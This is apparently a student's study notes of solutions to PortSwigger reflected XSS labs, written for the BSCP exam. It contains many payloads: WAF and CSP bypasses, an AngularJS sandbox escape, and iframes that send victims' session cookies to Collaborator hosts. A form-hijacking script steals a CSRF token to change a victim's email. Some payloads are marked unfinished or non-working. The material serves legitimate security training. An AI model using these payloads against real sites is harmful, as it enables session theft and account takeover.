
#### 1.x. Lab: Reflected XSS into attribute with angle brackets HTML-encoded ⭕️
This lab contains a reflected cross-site scripting vulnerability in the search blog functionality where angle brackets are HTML-encoded. To solve this lab, perform a cross-site scripting attack that injects an attribute and calls the `alert` function.

1. Enter a simple XSS payload > right click > Inspect > right click on the payload > Edit as HTML > notice `&lt;` and `&gt;` which means the angle brackets are HTML encoded.
	1. ![[XSS-20260126213400819.png]]
2. Notice that your input is within double quotes `"`. When you search your input there will be 2 results, check the 2nd one (the one in the input tag). **We can break out of those quotes**.
	1. ![[XSS-20260126212729487.png]]
3. Enter the following payload to break out of the quotes and solve.
	1. ![[XSS-20260126213319681.png]]

>[!tip] No User Interaction Required
> #Useful The `onmouseover` attribute require additional user interaction but this fires automatically: `" autofocus onfocus=alert(1) x="`

>[!tip] How to Identify this Vulnerability
>1. Search bar
>2. Angle brackets are HTML encoded: `&lt;` `&gt;`
>3. Input inside single quotes `'`



---

#### 1.x. Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded ⭕️
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets are encoded. The reflection occurs inside a JavaScript string. To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.
1. Enter something arbitrary `test123` in search bar and notice the input is inside a JavaScript string
	1. ![[XSS-20260126214919037.png]]
2. #Useful Enter this payload to solve: `'-alert(1)-'`. Notice the single quote to break out of the string but for 
	1. ![[XSS-20260126215313629.png]]

>[!info] Why `'alert(1)` Doesn't Work
>Without dashes `-`, payload is interpreted as a *string literal* and not JS code. Wrapping payloads with `-`, `+`, or `||` like `'||alert(1)||'` will interpret as JS code and will execute.

>[!tip] How to Identify this Vulnerability
>1. Search bar
>2. User input is wrapped in a JavaScript string (e.g., `var searchTerms='{input}';`)
>3. Angle brackets are HTML encoded so can't break out HTML

Test in search bar *don't url encode anything*
```
-fetch('https://OASTIFY.COM?c='+document.cookie)-
```

**Deliver exploit to victim**
```
<iframe src="https://0abd001503ce7b6581e41b1a00cd0016.web-security-academy.net/?search=%27-fetch%28%27https%3A%2F%2FOASTIFY.COM%3Fc%3D%27%2Bdocument.cookie%29-%27"></iframe>
```

---

#### 1.x. Lab: Reflected XSS into HTML context with most tags and attributes blocked ⭕️
This lab contains a reflected XSS vulnerability in the search functionality but uses a web application firewall (WAF) to protect against common XSS vectors.
To solve the lab, perform a cross-site scripting attack that bypasses the WAF and calls the `print()` function.
> This lab help us learn to identify which tags are allowed by the WAF. So we can use others to exploit XSS.

1. Input a basic xss payload in the search bar: `<img src=1 onerror=alert(document.cookie)>` and got an error "Tag is not allowed".
	1. ![[XSS-20260105204153035.png]]
2. Send the search GET request to Intruder, replace the `search=` value to just `<>` and click the Add button twice to get this:
	1. ![[XSS-20260105204347663.png]]
3. Go to the [PortSwigger XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet), click **Copy tags to clipboard**, and paste it in Intruder's payload configuration
	1. ![[XSS-20260105204527256.png]]
	2. Start attack, when done sort by Status Code, and got 200 OK for `body` and `custom tags`.
		1. ![[XSS-20260105204700433.png]]
4. Change the position to this: `search=<body%20$$=1>`
	1. ![[XSS-20260105204825551.png]]
	2. On the PortSwigger cheat sheet click **Copy events to clipboard**, in Intruder clear payloads and paste. Start attack and will see all the events that the app allows which we can use in our XSS payload.
		1.  ![[XSS-20260105205347565.png]]
5. Click Go to exploit server and in the Body enter the following:
```
<iframe src="https://0a800003030280359afcb34d005400fa.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
	1. Store > Deliver exploit to victim and solved.

**Deliver this exploit to victim**
```
# fetch example
<iframe src="https://0a5000f304e414f7801d0d520039007e.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=fetch(%27https%3a//bjy2x83unr2y2wcphabfe77ce3ku8owd.oastify.com/%3fc%3d%27%2bdocument.cookie)%3E" onload=this.style.width='100px'>

# document.location example
<iframe src="https://0a5000f304e414f7801d0d520039007e.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=document.location%3d'https%3a//bjy2x83unr2y2wcphabfe77ce3ku8owd.oastify.com/%3fc%3d'%2bdocument.cookie%3E" onload=this.style.width='100px'>
```

- - - 

#### 1.x. Lab: Reflected XSS with some SVG markup allowed ⭕️
This lab has a simple reflected XSS vulnerability. The site is blocking common tags but misses some SVG tags and events.
To solve the lab, perform a cross-site scripting attack that calls the `alert()` function.

1. Repeat Steps 1-3 from Lab 1.
	1. These 4 tags are allowed
	2. ![[XSS-20260105211123057.png]]
2. Modify the position, clear payload, paste in events from the cheat sheet and start attack
	1. `<svg><animatetransform%20§§=1>`
	2. The `onbegin` event is allowed
	3. ![[XSS-20260105211406448.png]]
3. Enter the following in the URL and solved: `https://0a4e000b0462559081e0d95d00f300e8.h1-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin=alert(1)%3E`

#ExamTip Use the following payload to grab the victim's session cookie. Use Inspector to URL encode special characters.
```
"><svg><animatetransform onbegin=document.location='https://7498llll5u5ih47lrtr6v08uelkd84wt.oastify.com/?cookies='+document.cookie;>
```

**Deliver exploit to victim**
```
# document.location example
<iframe src="https://YOUR-LAB-ID-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Ddocument.location%3D%27https%3A%2F%2FOASTIY.COM%2F%3Fcookies%3D%27%2Bdocument.cookie%3B%3E">
</iframe>

# fetch example
<iframe src="https://YOUR-LAB-ID-web-security-academy.net/?search=%22%3E%3Csvg%3E%3Canimatetransform%20onbegin%3Dfetch(%27https%3a//OASTIFY.COM/%3fc%3d%27%2bdocument.cookie)%3E">
</iframe>
```


- - -

#### 1.x. Lab: Reflected XSS into HTML context with nothing encoded ⭕️
This lab contains a simple reflected cross-site scripting vulnerability in the search functionality.
To solve the lab, perform a cross-site scripting attack that calls the `alert` function.

1. Simply enter `'<script>alert(1)</script>` in the search bar to solve.
2. Github study guide included this payload to grab the victim's session cookie. This tests the Assignable protocol with location javascript exploit(?)
	1. #ExamTip `<script>location.protocol='javascript';</script>#%0adocument.location='http://OASTIFY.COM/?p='+document.cookie//&context=html`

**Deliver exploit to victim**
```
# document.location example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%27%3Cscript%3Edocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fp%3D%27%2Bdocument.cookie%3C%2Fscript%3E"></iframe>

# fetch example
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%27%3Cscript%3Efetch%28%22https%3A%2F%2FOASTIFY.COM%2F%3Fp%3D%27%2Bdocument.cookie%22%29%3B%3C%2Fscript%3E"></iframe>
```

- - -

#### 1.x. Lab: Reflected XSS into HTML context with all tags blocked except custom ones ⭕️
This lab blocks all HTML tags except custom ones.
To solve the lab, perform a cross-site scripting attack that injects a custom tag and automatically alerts `document.cookie`.

1. Repeating the Copy tags to clipboard should yield all 400 status codes as none of the tags is allowed.
2. But a custom tag like `<xss+id=x>#x';` will get you a 200 OK.
	1. ![[XSS-20260105213220115.png]]
3. Go to exploit server, store, and deliver the following payload to victim to solve: 
```
<script>
location = 'https://TARGET.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>
```

**Deliver exploit to victim -- no need for `iframe`**
```
# document.location example
<script>
location = 'https://YOU-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Ddocument.location%3D%27https%3A%2F%2FOASTIFY.COM%2F%3Fc%3D%27%2Bdocument.cookie%20tabindex=1%3E#x';
</script>

# fetch example
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dfetch%28%22https%3A%2F%2FOASTIFY.COM%2F%3Fp%3D%22%2Bdocument.cookie%29%3B%20tabindex=1%3E#x';
</script>
```

- - - 

#### 1.x. Lab: Reflected XSS into a JavaScript string with single quote and backslash escaped ⭕️
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality. The reflection occurs inside a JavaScript string with single quotes and backslashes escaped.
To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.

1. Enter something like `test'payload` into the search bar and in the response see that the single quote is escaped with a `\`
	1. ![[XSS-20260106141822668.png]]
	2. ![[XSS-20260106141833547.png]]
2. Simply add `</script>` before your XSS payload to have it execute
	1. `</script><script>alert(1)</script>`
	2. ![[XSS-20260106142008128.png]]
	3. ![[XSS-20260106142232856.png]]
	4. ![[XSS-20260106142049361.png|306]]

#ExamTip 
> When placing this payload in `iframe`, the target application do not allow it to be embedded and give message: `refused to connect`.
> `</script><script>document.location="https://OASTIFY.COM/?cookie="+document.cookie</script>`

> In BSCP exam host the below payload on exploit server inside `<script>` tags, and the search query below before it is URL encoded.

```
</ScRiPt ><img src=a onerror=document.location="https://OASTIFY.COM/?biscuit="+document.cookie>
```

> Exploit Server hosting search term reflected vulnerability that is send to victim to obtain their session cookie.

```html
<script>
location = "https://TARGET.net/?search=%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E"
</script>
```

> The application gave error message `Tag is not allowed`, and this is bypassed using this `</ScRiPt >`.

**Deliver exploit to victim**
```
# decoded version 1
</script><script>document.location="https://OATSIFY.COM/?cookie="+document.cookie</script>

# decoded version 2
<script>
location = "https:///YOUR-LAB-ID.web-security-academy.net//?search=</ScRiPt ><img src=a onerror=document.location="https://OASTIFY.COM/?biscuit="+document.cookie>"
</script>

# URL encoded version
https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3E+location+%3D+%22https%3A%2F%2F%2F0aa000b00418f5fb825b4717007a00ba.web-security-academy.net%2F%2F%3Fsearch%3D%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E%22+%3C%2Fscript%3E

# iframe (if this doesn't work, swap single quotes with double quotes)
<iframe src='https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3E+location+%3D+%22https%3A%2F%2F%2F0aa000b00418f5fb825b4717007a00ba.web-security-academy.net%2F%2F%3Fsearch%3D%3C%2FScRiPt+%3E%3Cimg+src%3Da+onerror%3Ddocument.location%3D%22https%3A%2F%2FOASTIFY.COM%2F%3Fbiscuit%3D%22%2Bdocument.cookie%3E%22+%3C%2Fscript%3E'></script>
```


- - - 

#### 1.x. Lab: Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped ⭕️
This lab contains a reflected cross-site scripting vulnerability in the search query tracking functionality where angle brackets and double are HTML encoded and single quotes are escaped.
To solve this lab, perform a cross-site scripting attack that breaks out of the JavaScript string and calls the `alert` function.
https://youtu.be/Aqfl2Rj0qlU?t=598

1. Sending a payload with a single quote `'` gets escaped with a `\` which prevents the input to be escaped. 
	1. ![[XSS-20260106143234365.png]]
2. But enter `test\payload` and notice that it doesn't get escaped
	1. ![[XSS-20260106143315929.png]]
3. Use any of the payloads below to break out of the `searchTerms` string and have the JS execute
	1. ![[XSS-20260106143506309.png]]
	2. The semicolon like in `fuzzer\';console.log(12345);//` seems to indicate the end of a line in JS so you can run a new JS function which is `console.log` in this case.
#ExamTip 
Use these to test
```
\'-alert(1)//  

fuzzer\';console.log(12345);//  

fuzzer\';alert(`Testing The backtick a typographical mark used mainly in computing`);//

\';document.location=`https://OASTIFY.COM/?BackTicks=`+document.cookie;//
```

**Deliver exploit to victim**
```
# iframe and encoded
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%5C%27%3Bdocument.location%3D%60https%3A%2F%2FOASTIFY.COM%2F%3FBackTicks%3D%60%2Bdocument.cookie%3B%2F%2F"></iframe>

# decoded
\';document.location=`https://OASTIFY.COM/?BackTicks=`+document.cookie;//
```

- - - 
#### 1.x. Lab: Reflected XSS with AngularJS sandbox escape without strings ⭕️
This lab uses AngularJS in an unusual way where the `$eval` function is not available and you will be unable to use any strings in AngularJS.
To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the `alert` function without using the `$eval` function.

1. Entered `test'payload` in the search bar and notice in the AngularJS code that our payload was escaped and is the value for the `search` key.
	1. ![[XSS-20260106145307991.png]]
2. Now enter `/?search=value1&key2=value2` **in the URL** and see that it dynamically created another key `key2` and the value `value2`.
	1. ![[XSS-20260106145147733.png]]
	2. Can't do this in the search bar because it won't process it correctly:
		1. ![[XSS-20260106145542488.png]]
3. Enter this `1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1` in the URL `search=` to solve the lab
	1. ![[XSS-20260106150621258.png|306]]
	2. Using an ASCII to Text converter will show that the JS function that was executed was `alert(1)` 
		1. ![[XSS-20260106150840094.png]]
	3. ![[XSS-20260106150608454.png|315]]
##### Why does this work?
1. The exploit uses `toString()` to create a string without using quotes.
2. Then gets the String prototype and overwrites the `charAt` function for every string.
3. This breaks the AngularJS sandbox. allow an array passed to the `orderBy` filter.
4. Set the argument for the filter by again using `toString()` to create a string and the String constructor property.
5. Finally, use the `fromCharCode` method generate our payload by converting character codes into the payload example `x=alert(1)`.
6. The `charAt` function has been overwritten, AngularJS will allow this code to escape the **Sandbox**.

#ExamTip Use this payload in the exam
```
# Payload to grab the victim's session cookie
x=fetch('https://m9w8haeauh0frftrtjdvexkyrpxgl69v.oastify.com/?z='+document.cookie)

# Payload in ASCII form
120,61,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,103,112,57,111,49,56,57,51,106,97,107,49,100,122,101,55,117,116,118,50,114,107,118,114,48,105,54,57,117,122,105,111,46,111,97,115,116,105,102,121,46,99,111,109,47,63,122,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41
```

> Use this to get payload for a specific AngularJS version -- 1.4.4 in this case: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#angularjs-dom--1.4.4-(without-strings)

The following snippet is a basic python script to convert payload into ASCII
```
import sys

print('Python String to ASCII Converter!')
if len(sys.argv) != 2:
    print("Usage: Python ascii_converter.py 'Payload_String'")
    sys.exit(1)

input_string = sys.argv[1]
ascii_values = [str(ord(char)) for char in input_string]

output = ",".join(ascii_values)
print(output)
print('PortSwigger Expert Academy Labs!')
```
![[XSS-20260106151011594.png]]

How to convert
```
cd /Users/shixian/Documents/Hax/bscp
./ascii_converter.py 'PAYLOAD'

# example
./ascii_converter.py 'x=alert(1)'
```

*unfinished, dont know how a solution*
```
x=fetch('https://3jnux03mnj2q2ochh2b7ez74evkm8mwb.oastify.com/?z='+document.cookie)

120,61,102,101,116,99,104,40,39,104,116,116,112,115,58,47,47,51,106,110,117,120,48,51,109,110,106,50,113,50,111,99,104,104,50,98,55,101,122,55,52,101,118,107,109,56,109,119,98,46,111,97,115,116,105,102,121,46,99,111,109,47,63,122,61,39,43,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41

```

- - -

#### 1.x. Lab: Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped ⭕️
This lab contains a reflected cross-site scripting vulnerability in the search blog functionality. The reflection occurs inside a template string with angle brackets, single, and double quotes HTML encoded, and backticks escaped. To solve this lab, perform a cross-site scripting attack that calls the `alert` function inside the template string.

1. Enter a random string to observe the JS and notice that the `message` variable enclose the input with backticks. This is an **template literal**.
	1. ![[XSS-20260106151707709.png]]
2. Use this payload to solve `${alert(document.cookie)}`
	1. ![[XSS-20260106151915009.png]]

#ExamTip 
Payload to grab session cookie
```
${fetch(String.fromCharCode(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x30,0x62,0x63,0x6f,0x31,0x68,0x62,0x62,0x32,0x66,0x72,0x75,0x61,0x39,0x6b,0x79,0x64,0x35,0x78,0x77,0x6c,0x31,0x71,0x37,0x77,0x79,0x32,0x70,0x71,0x6e,0x65,0x63,0x2e,0x6f,0x61,0x73,0x74,0x69,0x66,0x79,0x2e,0x63,0x6f,0x6d,0x3f,0x74,0x65,0x73,0x7a,0x74,0x3d) + document.cookie)}
```
> The values inside `fromCharCode` are hexadecimal values
![[XSS-20260106152525038.png]]
> In order to easily convert our Burp Collaborator URL into hex use CyberChef > To Hex > Delimiter: 0x with comma and Bytes per line: 0
> ![[XSS-20260106152810396.png]]

>[!Tip] Proof of Concept 
>This is a PoC to show that the payload can grab cookies. **BUT you'd have to deliver this exploit to the victim**. This PoC only shows your own cookie.
>1. Create a dummy cookie in the browser 
>	1. ![[XSS-20260106154019536.png]]
>2. Get your Burp Collaborator link, put it in CyberChef, and put that in the payload.
>	1.![[XSS-20260106154120650.png|520]]
>	2.![[XSS-20260106154147351.png]]
>3. Paste it in the search bar and click Poll now in Burp Collaborator and we got the cookie. **Again, this PoC only show YOUR cookie, for the exam, send the full URL with the payload or "host" an iframe to the victim, they click on the link and then we'd have their cookie!**
>	1. ![[XSS-20260106154234218.png]]

**Deliver to victim**
```
# follow steps above -- payload to put in search bar should look similar to this
${fetch(String.fromCharCode(0x68,0x74,0x74,0x70,0x73,0x3a,0x2f,0x2f,0x64,0x78,0x65,0x34,0x62,0x61,0x68,0x77,0x31,0x74,0x67,0x30,0x67,0x79,0x71,0x72,0x76,0x63,0x70,0x68,0x73,0x39,0x6c,0x65,0x73,0x35,0x79,0x77,0x6d,0x78,0x61,0x6d,0x2e,0x6f,0x61,0x73,0x74,0x69,0x66,0x79,0x2e,0x63,0x6f,0x6d,0x2f,0x3f,0x63,0x3d) + document.cookie)}

# This is what the exploit kinda looks like
# Plug your payload (like above) to search bar, confirm it works, then HTTP History to grab the url encoded version, wrap in iframe then deliver to victim
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%24%7Bfetch%28String.fromCharCode%280x68%2C0x74%2C0x74%2C0x70%2C0x73%2C0x3a%2C0x2f%2C0x2f%2C0x64%2C0x78%2C0x65%2C0x34%2C0x62%2C0x61%2C0x68%2C0x77%2C0x31%2C0x74%2C0x67%2C0x30%2C0x67%2C0x79%2C0x71%2C0x72%2C0x76%2C0x63%2C0x70%2C0x68%2C0x73%2C0x39%2C0x6c%2C0x65%2C0x73%2C0x35%2C0x79%2C0x77%2C0x6d%2C0x78%2C0x61%2C0x6d%2C0x2e%2C0x6f%2C0x61%2C0x73%2C0x74%2C0x69%2C0x66%2C0x79%2C0x2e%2C0x63%2C0x6f%2C0x6d%2C0x2f%2C0x3f%2C0x63%2C0x3d%29+%2B+document.cookie%29%7D"></iframe>
```

- - - 

#### 1.x. Lab: Reflected XSS in canonical link tag ⭕️
This lab reflects user input in a canonical link tag and escapes angle brackets.

To solve the lab, perform a cross-site scripting attack on the home page that injects an attribute that calls the `alert` function.

To assist with your exploit, you can assume that the simulated user will press the following key combinations:
- `ALT+SHIFT+X`
- `CTRL+ALT+X`
- `Alt+X`
Please note that the intended solution to this lab is only possible in Chrome.
1. Notice there are no obvious input fields like a search bar for reflected XSS. Notice `canonical` when you search for it in the response.
	1. ![[XSS-20260127162323018.png]]
2. Enter something arbitrary in the URL like `?test123` and notice it is reflected in the response.
	1. ![[XSS-20260127162428328.png]]
3. Break out of the link tag with `'onclick='alert(1)`. The trailing single quote was added by the app.
	1. ![[XSS-20260127163132289.png]]
4. We need the `accesskey` attribute to solve this lab. 
	1. ![[XSS-20260127163235011.png]]
	2. In the URL it will look like this: `?%27accesskey=%27x%27onclick=%27alert(1)`
>The alert won't trigger until the user press those combinations up top.

>[!tip] How to Identify this Vulnerability
>1. No obvious input field e.g., search bar
>2. `canoncial` in the response
>3. `?{input}` in the URL gets reflected in the response

**Never got it to work**
```
<iframe src="https://0a9a009804b33c6e80230389007d00e5.web-security-academy.net/?%27accesskey=%27x%27onclick=%27document.location%3d"https%3a//wddnrtxfhcwjwh6abv508s1x8oef2hq6.oastify.com/%3fcookie%3d"%2bdocument.cookie"></iframe>
```

---

#### 1.x. Lab: Reflected XSS protected by very strict CSP, with dangling markup attack ⭕️
This lab uses a strict CSP that prevents the browser from loading subresources from external domains.

To solve the lab, perform a form hijacking attack that bypasses the CSP, exfiltrates the simulated victim user's CSRF token, and uses it to authorize changing the email to `hacker@evil-user.net`.

You must label your vector with the word "Click" in order to induce the simulated user to click it. For example: `<a href="">Click me</a>`

You can log in to your own account using the following credentials: `wiener:peter`
1. Login and notice the app has a CSP header + `csrf` token in the response
	1. ![[XSS-20260127201549042.png]]
	2. ![[XSS-20260127201624487.png]]
2. Update email feature has client side validation
	1. ![[XSS-20260127201927778.png]]
3. Bypass client-side validation:
	1. Right click > Inspect on email field > right click Edit as HTML > change `type="email"` to `type="text"`. 
		1. ![[XSS-20260127202242805.png]]
	2. Enter the following payload: `foo@example.com"><img src= onerror=alert(1)>` to break out of that `<input>` tag. Notice the app properly HTML encode angle brackets. 
		1. ![[XSS-20260127202339680.png]]
4. Enter this in the URL: `?email="><img src onerror=alert(1)>` notice that we were able to get it reflected and break out of the input tag but it didn't execute probably due to the CSP header. Console confirms CSP blocked the inline script.
	1. ![[XSS-20260127202646194.png]]
	2. ![[XSS-20260127202735061.png]]
	3. ![[XSS-20260127202823149.png]]
5. From Step 1 notice `form-action` is missing from the CSP. **Find out why this is important**. 
6. Enter the payload below in the URL. Replace your exploit server id. Notice the "Click Me" button rendered.
	1. ![[XSS-20260127203437918.png|172]]
```
/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit">Click me</button>
```
7. Click on the button and we got redirected to the exploit server's `/exploit` endpoint. **This confirms us bypassing CSP and allow redirection of form submissions to an external server**.
	1. ![[XSS-20260127203524992.png]]
8. Change the payload to resemble the one below. Notice `formmethod="get"`. **This will grab the victim's csrf token and put it in the URL**.
	1. ![[XSS-20260127203849594.png]]
```
/my-account?email=foo@bar"><button formaction="https://exploit-YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit" formmethod="get">Click me</button>
```
9. Paste the payload below to the exploit server's body > deliver exploit to victim to change the victim's email and solve the lab. Replace `your-lab-url` and `exploitServer`.
```
<body> <script> // Define the URLs for the lab environment and the exploit server. const academyFrontend = "https://your-lab-url.net/"; const exploitServer = "https://your-exploit-server.net/exploit"; // Extract the CSRF token from the URL. const url = new URL(location); const csrf = url.searchParams.get('csrf'); // Check if a CSRF token was found in the URL. if (csrf) { // If a CSRF token is present, create dynamic form elements to perform the attack. const form = document.createElement('form'); const email = document.createElement('input'); const token = document.createElement('input'); // Set the name and value of the CSRF token input to utilize the extracted token for bypassing security measures. token.name = 'csrf'; token.value = csrf; // Configure the new email address intended to replace the user's current email. email.name = 'email'; email.value = 'hacker@evil-user.net'; // Set the form attributes, append the form to the document, and configure it to automatically submit. form.method = 'post'; form.action = `${academyFrontend}my-account/change-email`; form.append(email); form.append(token); document.documentElement.append(form); form.submit(); // If no CSRF token is present, redirect the browser to a crafted URL that embeds a clickable button designed to expose or generate a CSRF token by making the user trigger a GET request } else { location = `${academyFrontend}my-account?email=blah@blah%22%3E%3Cbutton+class=button%20formaction=${exploitServer}%20formmethod=get%20type=submit%3EClick%20me%3C/button%3E`; } </script> </body>
```

>[!tip] How to Identify this Vulnerability
>1. Update email feature + client side validation
>2. CSP header + `csrf` token + angle brackets are HTML encoded



---
#TODO Understand this topic on **XSS via JSON into EVAL** in the Practice Exam: https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study?tab=readme-ov-file#xss-via-json-into-eval
- - - 